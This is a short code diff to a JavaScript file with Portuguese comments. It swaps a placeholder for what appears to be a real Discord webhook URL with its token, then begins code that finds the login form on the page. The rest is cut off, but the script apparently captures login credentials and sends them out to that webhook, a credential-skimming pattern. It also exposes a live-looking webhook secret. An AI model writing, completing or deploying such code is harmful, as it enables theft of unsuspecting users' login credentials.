@@ -1,5 +1,5 @@
 // COLE A URL DO SEU WEBHOOK DO DISCORD ABAIXO
-const WEBHOOK_URL = "SUA_URL_DO_WEBHOOK_AQUI";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1559620080118272010/Gq-CtSMlCnFbvzLJ8cukyGFKYDYBwVI-fWcy2P3Hfe7k7zKusFieTlaK0LUbEd2BeE_9";
 
 document.addEventListener("DOMContentLoaded", () => {
     // Localiza o formulário de login na página
